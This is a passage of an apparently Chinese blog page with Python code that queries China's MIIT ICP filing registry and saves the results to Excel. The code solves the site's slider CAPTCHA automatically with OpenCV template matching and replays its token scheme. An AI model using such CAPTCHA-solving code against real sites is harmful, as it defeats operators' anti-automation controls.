class="line">            <span class="comment"># 过滤空值和特殊字符，只允许 - . () 分别用于域名和公司名</span></span><br><span class="line">            <span class="keyword">if</span> info == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;InputNone&quot;</span>)</span><br><span class="line">            info = re.sub(<span class="string">&quot;[^\\u4e00-\\u9fa5-A-Za-z0-9,-.()（）]&quot;</span>, <span class="string">&quot;&quot;</span>, info)</span><br><span class="line">            input_zh = re.<span class="built_in">compile</span>(<span class="string">u&#x27;[\u4e00-\u9fa5]&#x27;</span>)</span><br><span class="line">            zh_match = input_zh.search(info)</span><br><span class="line">            <span class="keyword">if</span> zh_match:</span><br><span class="line">                info_result = info</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 检测是否为可备案的域名类型（类型同步日期2022/01/06）</span></span><br><span class="line">                <span class="comment"># TODO 部分特殊域名, 如51.la也能备案, 可能是特事特办</span></span><br><span class="line">                input_url = re.<span class="built_in">compile</span>(</span><br><span class="line">                    <span class="string">r&#x27;([^.]+)(?:\.(?:GOV\.cn|ORG\.cn|AC\.cn|MIL\.cn|NET\.cn|EDU\.cn|COM\.cn|BJ\.cn|TJ\.cn|SH\.cn|CQ\.cn|HE\.cn|SX\.cn|NM\.cn|LN\.cn|JL\.cn|HL\.cn|JS\.cn|ZJ\.cn|AH\.cn|FJ\.cn|JX\.cn|SD\.cn|HA\.cn|HB\.cn|HN\.cn|GD\.cn|GX\.cn|HI\.cn|SC\.cn|GZ\.cn|YN\.cn|XZ\.cn|SN\.cn|GS\.cn|QH\.cn|NX\.cn|XJ\.cn|TW\.cn|HK\.cn|MO\.cn|cn|REN|WANG|CITIC|TOP|SOHU|XIN|COM|NET|CLUB|XYZ|VIP|SITE|SHOP|INK|INFO|MOBI|RED|PRO|KIM|LTD|GROUP|BIZ|AUTO|LINK|WORK|LAW|BEER|STORE|TECH|FUN|ONLINE|ART|DESIGN|WIKI|LOVE|CENTER|VIDEO|SOCIAL|TEAM|SHOW|COOL|ZONE|WORLD|TODAY|CITY|CHAT|COMPANY|LIVE|FUND|GOLD|PLUS|GURU|RUN|PUB|EMAIL|LIFE|CO|FASHION|FIT|LUXE|YOGA|BAIDU|CLOUD|HOST|SPACE|PRESS|WEBSITE|ARCHI|ASIA|BIO|BLACK|BLUE|GREEN|LOTTO|ORGANIC|PET|PINK|POKER|PROMO|SKI|VOTE|VOTO|ICU))&#x27;</span>,</span><br><span class="line">                    flags=re.IGNORECASE)</span><br><span class="line">                info_result = input_url.search(info)</span><br><span class="line">                <span class="keyword">if</span> info_result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> info.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>] == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">&quot;OnlyDomainInput&quot;</span>)</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">&quot;ValidType&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    info_result = info_result.group()</span><br><span class="line">            info_data = &#123;<span class="string">&#x27;pageNum&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;unitName&#x27;</span>: info_result&#125;</span><br><span class="line">            <span class="keyword">return</span> info_data</span><br><span class="line">        <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(e) == <span class="string">&#x27;InputNone&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>(e) == <span class="string">&#x27;OnlyDomainInput&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n ************** 请正确输入域名 **************\n&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n*** 该域名不支持备案，请查阅：http://xn--fiq8ituh5mn9d1qbc28lu5dusc.xn--vuq861b/ ***\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookies</span>():</span><br><span class="line">    cookie_headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32&#x27;</span>&#125;</span><br><span class="line">    err_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> err_num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cookie = requests.utils.dict_from_cookiejar(requests.get(<span class="string">&#x27;https://beian.miit.gov.cn/&#x27;</span>, headers=cookie_headers).cookies)[<span class="string">&#x27;__jsluid_s&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> cookie</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            err_num += <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>():</span><br><span class="line">    timeStamp = <span class="built_in">round</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    authSecret = <span class="string">&#x27;testtest&#x27;</span> + <span class="built_in">str</span>(timeStamp)</span><br><span class="line">    authKey = hashlib.md5(authSecret.encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()</span><br><span class="line">    auth_data = &#123;<span class="string">&#x27;authKey&#x27;</span>: authKey, <span class="string">&#x27;timeStamp&#x27;</span>: timeStamp&#125;</span><br><span class="line">    url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/auth&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t_response = requests.post(url=url, data=auth_data, headers=base_header).json()</span><br><span class="line">        token = t_response[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;bussiness&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_check_pic</span>(<span class="params">token</span>):</span><br><span class="line">    url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/image/getCheckImage&#x27;</span></span><br><span class="line">    base_header[<span class="string">&#x27;Accept&#x27;</span>] = <span class="string">&#x27;application/json, text/plain, */*&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p_request = requests.post(url=url, data=<span class="string">&#x27;&#x27;</span>, headers=base_header).json()</span><br><span class="line">        p_uuid = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">        big_image = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;bigImage&#x27;</span>]</span><br><span class="line">        small_image = p_request[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;smallImage&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="comment"># 解码图片，写入并计算图片缺口位置</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bigImage.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(big_image))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;smallImage.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(small_image))</span><br><span class="line">    background_image = cv2.imread(<span class="string">&#x27;bigImage.jpg&#x27;</span>, cv2.COLOR_GRAY2RGB)</span><br><span class="line">    fill_image = cv2.imread(<span class="string">&#x27;smallImage.jpg&#x27;</span>, cv2.COLOR_GRAY2RGB)</span><br><span class="line">    position_match = cv2.matchTemplate(background_image, fill_image, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">    max_loc = cv2.minMaxLoc(position_match)[<span class="number">3</span>][<span class="number">0</span>]</span><br><span class="line">    mouse_length = max_loc + <span class="number">1</span></span><br><span class="line">    os.remove(<span class="string">&#x27;bigImage.jpg&#x27;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;smallImage.jpg&#x27;</span>)</span><br><span class="line">    check_data = &#123;<span class="string">&#x27;key&#x27;</span>: p_uuid, <span class="string">&#x27;value&#x27;</span>: mouse_length&#125;</span><br><span class="line">    <span class="keyword">return</span> check_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sign</span>(<span class="params">check_data, token</span>):</span><br><span class="line">    check_url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/image/checkImage&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pic_sign = requests.post(check_url, json=check_data, headers=base_header).json()</span><br><span class="line">        sign = pic_sign[<span class="string">&#x27;params&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_beian_info</span>(<span class="params">info_data, p_uuid, token, sign</span>):</span><br><span class="line">    domain_list = []</span><br><span class="line">    info_url = <span class="string">&#x27;https://hlwicpfwc.miit.gov.cn/icpproject_query/api/icpAbbreviateInfo/queryByCondition&#x27;</span></span><br><span class="line">    base_header.update(&#123;<span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>: p_uuid, <span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;sign&#x27;</span>: sign&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        beian_info = requests.post(url=info_url, json=info_data, headers=base_header).json()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> beian_info[<span class="string">&quot;success&quot;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;请求错误: CODE <span class="subst">&#123;beian_info[<span class="string">&quot;code&quot;</span>]&#125;</span> MSG <span class="subst">&#123;beian_info[<span class="string">&quot;msg&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> domain_list</span><br><span class="line">        domain_total = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;total&#x27;</span>]</span><br><span class="line">        page_total = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;lastPage&#x27;</span>]</span><br><span class="line">        end_row = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;endRow&#x27;</span>]</span><br><span class="line">        info = info_data[<span class="string">&#x27;unitName&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n查询对象：<span class="subst">&#123;info&#125;</span> 共有 <span class="subst">&#123;domain_total&#125;</span> 个已备案域名\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, page_total):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在查询第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>页……\n&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, end_row + <span class="number">1</span>):</span><br><span class="line">                info_base = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;list&#x27;</span>][k]</span><br><span class="line">                domain_name = info_base[<span class="string">&#x27;domain&#x27;</span>]</span><br><span class="line">                domain_type = info_base[<span class="string">&#x27;natureName&#x27;</span>]</span><br><span class="line">                domain_licence = info_base[<span class="string">&#x27;mainLicence&#x27;</span>]</span><br><span class="line">                website_licence = info_base[<span class="string">&#x27;serviceLicence&#x27;</span>]</span><br><span class="line">                domain_status = info_base[<span class="string">&#x27;limitAccess&#x27;</span>]</span><br><span class="line">                domain_approve_date = info_base[<span class="string">&#x27;updateRecordTime&#x27;</span>]</span><br><span class="line">                domain_owner = info_base[<span class="string">&#x27;unitName&#x27;</span>]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    domain_content_approved = info_base[<span class="string">&#x27;contentTypeName&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> domain_content_approved == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                        domain_content_approved = <span class="string">&quot;无&quot;</span></span><br><span class="line">                <span class="keyword">except</span> KeyError:</span><br><span class="line">                    domain_content_approved = <span class="string">&quot;无&quot;</span></span><br><span class="line">                row_data = domain_owner, domain_name, domain_licence, website_licence, domain_type, domain_content_approved, domain_status, domain_approve_date</span><br><span class="line">                domain_list.append(row_data)</span><br><span class="line">            info_data = &#123;<span class="string">&#x27;pageNum&#x27;</span>: i + <span class="number">2</span>, <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;unitName&#x27;</span>: info&#125;</span><br><span class="line">            <span class="keyword">if</span> beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;isLastPage&#x27;</span>] <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                beian_info = requests.post(info_url, json=info_data, headers=base_header).json()</span><br><span class="line">                end_row = beian_info[<span class="string">&#x27;params&#x27;</span>][<span class="string">&#x27;endRow&#x27;</span>]</span><br><span class="line">                time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;意外错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> domain_list</span><br><span class="line">    <span class="keyword">return</span> domain_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_saver</span>(<span class="params">domain_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    打印最终结果，并保存数据至Excel表格，同时调整表格格式。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 计算需要写入表格的总行数，如果是空列表，即代表该域名没有备案信息，也有可能是获取信息失败了</span></span><br><span class="line">    total_row = <span class="built_in">len</span>(domain_list)</span><br><span class="line">    <span class="keyword">if</span> total_row == <span class="number">1</span>:</span><br><span class="line">        total_row = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> total_row == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;所查域名无备案\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;查询结果如下:\n\n<span class="subst">&#123;domain_list&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="comment"># Windows获取桌面路径，将表格保存到桌面，其他系统默认保存到/home/文件夹下</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">        <span class="keyword">import</span> winreg</span><br><span class="line">        <span class="comment"># 用户更改过桌面路径，则需获取User Shell Folders才能获取到准确的桌面路径，否则不会保存到实际的桌面</span></span><br><span class="line">        subkey = <span class="string">r&#x27;Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&#x27;</span></span><br><span class="line">        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, <span class="number">0</span>)</span><br><span class="line">        desktop_raw = <span class="built_in">str</span>(winreg.QueryValueEx(key, <span class="string">&quot;Desktop&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> desktop_raw == <span class="string">&quot;%USERPROFILE%\Desktop&quot;</span>:</span><br><span class="line">            <span class="comment"># 此时情况为用户未更改过桌面路径，则需获取系统默认路径</span></span><br><span class="line">            subkey = <span class="string">r&#x27;Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&#x27;</span></span><br><span class="line">            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, <span class="number">0</span>)</span><br><span class="line">            desktop_raw = <span class="built_in">str</span>(winreg.QueryValueEx(key, <span class="string">&quot;Desktop&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">        desktop_path = desktop_raw.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">        file_path = <span class="string">f&quot;<span class="subst">&#123;desktop_path&#125;</span>备案信息.xlsx&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file_path = <span class="string">&#x27;./备案信息.xlsx&#x27;</span></span><br><span class="line">    <span class="comment"># 存在对应文件，则读取表格追加写入，不存在则创建，并设置表格的标题、列宽、冻结窗格、文字布局等格式</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(file_path):</span><br><span class="line">        wb = xl.load_workbook(file_path)</span><br><span class="line">        ws = wb[<span class="string">&#x27;备案信息&#x27;</span>]</span><br><span class="line">        max_row = ws.max_row</span><br><span class="line">        start = max_row + <span class="number">1</span></span><br><span class="line">        total_row = total_row + start</span><br><span class="line">        after_title = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        wb = xl.Workbook()</span><br><span class="line">        ws = wb.active</span><br><span class="line">        ws.title = <span class="string">&quot;备案信息&quot;</span></span><br><span class="line">        title_list = [<span class="string">&#x27;域名主办方&#x27;</span>, <span class="string">&#x27;域名&#x27;</span>, <span class="string">&#x27;备案许可证号&#x27;</span>, <span class="string">&#x27;网站备案号&#x27;</span>, <span class="string">&#x27;域名类型&#x27;</span>, <span class="string">&#x27;网站前置审批项&#x27;</span>, <span class="string">&#x27;是否限制接入&#x27;</span>, <span class="string">&#x27;审核通过日期&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            ws.cell(<span class="number">1</span>, i + <span class="number">1</span>).value = title_list[i]</span><br><span class="line">        col_width = &#123;<span class="string">&#x27;A&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">40</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;E&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;F&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;G&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;H&#x27;</span>: <span class="number">21</span>&#125;</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> col_width.items():</span><br><span class="line">            ws.column_dimensions[k].width = v</span><br><span class="line">        ws.freeze_panes = <span class="string">&#x27;A2&#x27;</span></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        after_title = <span class="number">2</span></span><br><span class="line">    <span class="comment"># 写入查询数据</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start, total_row + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ws.cell(j + after_title, k + <span class="number">1</span>).value = domain_list[j - start][k]</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 垂直居中</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(ws.max_row):</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(ws.max_column):</span><br><span class="line">            ws.cell(row + <span class="number">1</span>, col + <span class="number">1</span>).alignment = Alignment(horizontal=<span class="string">&#x27;center&#x27;</span>, vertical=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        wb.save(file_path)</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;** 备案信息登记表格已打开，无法写入文件。如需写入，请关闭文件后重新执行！ **\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;查询结果保存在：<span class="subst">&#123;file_path&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;OK&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    cookie = get_cookies()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        info = query_base()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">global</span> base_header</span><br><span class="line">            base_header = &#123;</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://beian.miit.gov.cn&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://beian.miit.gov.cn/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;__jsluid_s=<span class="subst">&#123;cookie&#125;</span>&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># -1代表对应步骤失败了，不是-1则正常执行下一步</span></span><br><span class="line">            <span class="keyword">if</span> cookie != -<span class="number">1</span>:</span><br><span class="line">                token = get_token()</span><br><span class="line">                <span class="keyword">if</span> token != -<span class="number">1</span>:</span><br><span class="line">                    check_data = get_check_pic(token)</span><br><span class="line">                    <span class="keyword">if</span> check_data != -<span class="number">1</span>:</span><br><span class="line">                        sign = get_sign(check_data, token)</span><br><span class="line">                        p_uuid = check_data[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">                        <span class="keyword">if</span> sign != -<span class="number">1</span>:</span><br><span class="line">                            domain_list = get_beian_info(info, p_uuid, token, sign)</span><br><span class="line">                            data_saver(domain_list)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Sign遇到错误，请重试！&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">&quot;计算图片缺口位置错误，请重试！&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Token失败，如频繁失败请关闭程序后等待几分钟再试！&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cookie = get_cookies()</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;获取Cookie失败，请重试！&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e&#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>批量脚本（ICP_checks.py）:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span 